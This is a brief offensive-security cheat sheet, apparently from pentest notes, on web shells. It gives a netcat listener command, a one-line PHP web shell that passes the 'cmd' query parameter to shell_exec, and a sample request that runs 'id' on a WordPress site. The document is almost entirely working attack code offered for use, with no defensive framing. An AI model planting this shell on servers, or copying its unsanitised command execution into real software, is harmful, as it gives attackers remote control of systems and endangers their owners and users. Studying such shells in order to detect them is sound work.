# Web shells

Instead of enumerating a system with simple command injection on a web application, an attacker can opt to inject code that spawns a shell for executing commands on the target sytem.

## Listeners

### Netcat listener
```
nc -lvp 443
```


## Simple PHP web shell
Assuming you are able to put a file on the web server or edit an existing one (e.g. CMS template) this is the simplest type of shell:

```
<?php echo shell_exec($_GET['cmd']); ?>
```
You can use it for system commands: 
```
http://127.0.0.1/wordpress/index.php?cmd=id
```
